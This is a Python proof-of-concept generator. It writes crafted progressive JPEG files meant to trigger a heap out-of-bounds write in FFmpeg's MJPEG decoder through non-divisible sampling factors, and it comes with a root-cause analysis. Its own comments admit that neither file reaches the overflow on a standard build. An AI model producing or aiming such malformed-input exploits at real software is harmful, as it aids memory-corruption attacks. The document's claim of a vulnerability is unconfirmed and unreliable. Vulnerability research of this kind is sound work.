#!/usr/bin/env python3
"""
VULN-001 PoC Generator: Progressive JPEG blocks[] Heap OOB Write
via Non-Divisible Sampling Factors.

Root cause analysis:
- ff_mjpeg_decode_sof() allocates blocks[c] with size = bw*bh*h_count[c]*v_count[c]
  where bw = ceil(width / (h_max*8)).
- ff_mjpeg_decode_sos() for non-interleaved SOS computes:
    h = h_max / h_scount[0]   (INTEGER DIVISION - rounds down!)
    mb_width = ceil(width / (h*8))
- If h_max is NOT evenly divisible by h_count[c], then h < h_max/h_count[c]
  and mb_width > bw*h_count[c] = block_stride[c], causing OOB.

CRITICAL CONSTRAINT (confirmed by source analysis):
  The vulnerable configuration (e.g., 3:2:1 subsampling giving pix_fmt_id=0x31211100)
  is rejected by FFmpeg's pixel format check in ff_mjpeg_decode_sof() at line 717-722:
    avpriv_report_missing_feature(s->avctx, "Pixel format 0x%x bits:%d", ...)
    return AVERROR_PATCHWELCOME;
  This check runs BEFORE blocks[] is allocated (line 808), so the SOF fails
  and the SOS is never reached. The vulnerability path is:
    SOF succeeds → blocks[] allocated → SOS → OOB
  But non-standard pixel formats cause SOF to fail.

This PoC generates two files:
1. vuln_001_input.jpg: The ideal trigger with 3:2:1 subsampling (REJECTED by pixel fmt check)
2. vuln_001_input_alt.jpg: A recognized format 0x31111100 (YUV444P-like with 3:1:1 subsampling)
   that exercises the same code path but cannot OOB with standard math.

For the OOB to be actually triggered, FFmpeg would need to either:
a) Accept the non-standard 3:2:1 pixel format (or any format where h_max % h_count != 0), OR
b) Have a custom build without the pixel format guard at line 717-722.

Key OOB parameters (if the pixel format check were bypassed):
  width=72, h_max=3, h_count[c=1]=2, height=8
  → bw=3, blocks[1] size=6, mb_width=9, block_idx reaches 8 → OOB!
"""

import struct

def u16be(v):
    return struct.pack('>H', v)

def make_soi():
    return b'\xff\xd8'

def make_dqt(table_id=0):
    quant_vals = bytes([1] * 64)
    payload = bytes([table_id]) + quant_vals   # precision+id, 64 bytes
    return b'\xff\xdb' + u16be(2 + len(payload)) + payload

def make_sof2(width, height, components):
    """
    components: list of (comp_id, h_count, v_count, quant_id)
    """
    comp_data = b''.join(bytes([cid, (h<<4)|v, q]) for cid, h, v, q in components)
    payload = bytes([8]) + u16be(height) + u16be(width) + bytes([len(components)]) + comp_data
    return b'\xff\xc2' + u16be(2 + len(payload)) + payload

def make_dht_dc(table_id=0, counts=None, vals=None):
    """DC Huffman table"""
    if counts is None:
        # 1 code of length 2 for category 0 (DC diff=0, code="00")
        counts = bytes([0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
    if vals is None:
        vals = bytes([0x00])  # category 0
    payload = bytes([0x00 | table_id]) + counts + vals
    return b'\xff\xc4' + u16be(2 + len(payload)) + payload

def make_dht_ac(table_id=0, counts=None, vals=None):
    """AC Huffman table (also populates vlcs[2] for progressive)"""
    if counts is None:
        counts = bytes([0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
    if vals is None:
        vals = bytes([0x00])  # EOB
    payload = bytes([0x10 | table_id]) + counts + vals
    return b'\xff\xc4' + u16be(2 + len(payload)) + payload

def make_sos(components_sos, Ss=0, Se=0, Ah=0, Al=0):
    """
    components_sos: list of (comp_id, Td, Ta)
    Length field must be 4 + 2*n_components (validated at line 1704)
    """
    n = len(components_sos)
    comp_bytes = b''.join(bytes([cid, (Td<<4)|Ta]) for cid, Td, Ta in components_sos)
    payload = bytes([n]) + comp_bytes + bytes([Ss, Se, (Ah<<4)|Al])
    return b'\xff\xda' + u16be(2 + len(payload)) + payload

def make_eoi():
    return b'\xff\xd9'

# ---- PRIMARY PoC: 3:2:1 subsampling (NON-STANDARD, REJECTED by pixel format check) ----
def build_primary():
    """
    Ideal trigger. pix_fmt_id = 0x31211100 → NOT in recognized formats →
    SOF fails with AVERROR_PATCHWELCOME → SOS never reached.
    Included to document the intended trigger.
    """
    parts = [
        make_soi(),
        make_dqt(0),
        # SOF2: 3 components with 3:2:1 subsampling
        # comp 1: h=3, v=1 (sets h_max=3)
        # comp 2: h=2, v=1 (h_max % h_count = 3%2 = 1 ≠ 0 → the buggy component)
        # comp 3: h=1, v=1
        make_sof2(72, 8, [(0x01, 3, 1, 0), (0x02, 2, 1, 0), (0x03, 1, 1, 0)]),
        make_dht_dc(0),
        make_dht_ac(0),
        # SOS: non-interleaved scan of comp 2 (h_count=2)
        # h = h_max/h_count = 3/2 = 1 (integer div!)
        # mb_width = ceil(72/(1*8)) = 9
        # blocks[1] size = bw*bh*2 = 3*1*2 = 6
        # block_idx when mb_x=8 → OOB!
        make_sos([(0x02, 0, 0)], Ss=0, Se=0),
        # Scan data: 9 MCUs × Huffman code "00" for DC=0 = 18 bits
        # 18 bits of zeros + 6 padding bits (1s): 0x00 0x00 0x3F
        b'\x00\x00\x3f',
        make_eoi(),
    ]
    return b''.join(parts)

# ---- ALTERNATIVE PoC: 3:1:1 subsampling (RECOGNIZED as YUV444P with upscaling) ----
def build_alternative():
    """
    Uses recognized format 0x31111100 (line 675 of mjpegdec.c).
    h_max=3 but all h_counts divide h_max: 3%3=0, 3%1=0.
    Exercises the vulnerable code path but no OOB occurs because:
      bw = ceil(width/24), mb_width = ceil(width/8) ≤ 3*bw = block_stride[0]
    This demonstrates the code path but cannot trigger the actual OOB.
    """
    parts = [
        make_soi(),
        make_dqt(0),
        # SOF2: 3:1:1 subsampling — recognized as YUV444P with upscale_h
        # comp 1: h=3, v=1 (sets h_max=3)
        # comp 2: h=1, v=1
        # comp 3: h=1, v=1
        make_sof2(72, 8, [(0x01, 3, 1, 0), (0x02, 1, 1, 0), (0x03, 1, 1, 0)]),
        make_dht_dc(0),
        make_dht_ac(0),
        # SOS: non-interleaved scan of comp 1 (h_count=3)
        # h = h_max / h_count[0] = 3/3 = 1 (exact division, no bug)
        # mb_width = ceil(72/8) = 9
        # blocks[0] size = bw*bh*3 = 3*1*3 = 9
        # block_idx max = 8 < 9 → within bounds (by 1!)
        make_sos([(0x01, 0, 0)], Ss=0, Se=0),
        # Scan data: 9 MCUs
        b'\x00\x00\x3f',
        make_eoi(),
    ]
    return b''.join(parts)


if __name__ == '__main__':
    primary = build_primary()
    with open('vuln_001_input.jpg', 'wb') as f:
        f.write(primary)
    print(f'Written {len(primary)} bytes to vuln_001_input.jpg')
    print('  NOTE: This file will be REJECTED by FFmpeg pixel format check (pix_fmt=0x31211100).')
    print('  The SOF fails before blocks[] is allocated; SOS OOB never reached.')

    alt = build_alternative()
    with open('vuln_001_input_alt.jpg', 'wb') as f:
        f.write(alt)
    print(f'Written {len(alt)} bytes to vuln_001_input_alt.jpg')
    print('  NOTE: This file uses recognized format 0x31111100 (YUV444P-like).')
    print('  Exercises the vulnerable code path but no OOB (3*ceil(w/24)>=ceil(w/8)).')
